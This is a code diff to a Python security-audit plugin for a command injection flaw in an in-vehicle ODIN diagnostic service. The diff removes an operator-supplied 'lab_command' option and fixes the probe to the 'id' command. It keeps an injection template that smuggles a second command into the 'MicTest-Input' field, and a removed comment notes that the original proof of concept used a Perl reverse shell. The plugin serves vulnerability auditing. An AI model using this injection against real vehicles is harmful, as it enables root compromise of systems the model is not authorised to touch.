@@ -19,8 +19,7 @@ Technique (01-ROOT-SHELL-VIA-ODIN.md):
 Safety gate: is_disruptive=True.
   Plugin sends a benign probe (GET /api/v1/status) to confirm ODIN is present,
   then checks for the vulnerable endpoint structure.
-  Full command injection payload only fires when allow_disruptive=true and
-  'lab_command' param is supplied by the operator.
+  A fixed, non-destructive identity command is used for exploit confirmation.
 """
 from __future__ import annotations
 
@@ -65,8 +64,7 @@ _PROBE_PAYLOAD = {
     "MicTest-Input": "0",
 }
 
-# Injection payload template – operator supplies actual command via lab_command param
-# Original PoC used Perl reverse shell; here we default to 'id' for readiness check
+# Fixed identity probe. Arbitrary operator-supplied commands are prohibited.
 _INJECT_TEMPLATE = {
     "task": "TEST_DIGITAL-MICS_X_FUNCTIONAL-CHECK",
     "MicTest-Input": "0; {cmd} 2>&1 &",
@@ -107,7 +105,7 @@ def _run_poc(plugin):
     target = (plugin.params or {}).get("target_ip", "192.168.90.100")
     allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
         bool((plugin.params or {}).get("allow_disruptive"))
-    lab_command = (plugin.params or {}).get("lab_command", "id")
+    lab_command = "id"
 
     base = ODIN_BASE.format(host=target)
 
@@ -171,7 +169,7 @@ class Poc71CVE202242008OdinCommandInjectionRceAuditPlugin(IVIVulnerabilityPlugin
     meta_protocol   = "http"
     meta_target_os  = ["linux"]
     meta_required_params = ["target_ip"]
-    meta_optional_params = ["lab_command"]
+    meta_optional_params = []
     meta_profiles   = ["network"]
     meta_source_url = "https://github.com/AnalyticETH/tesla-security-research"
     meta_references       = ['https://github.com/AnalyticETH/tesla-security-research']
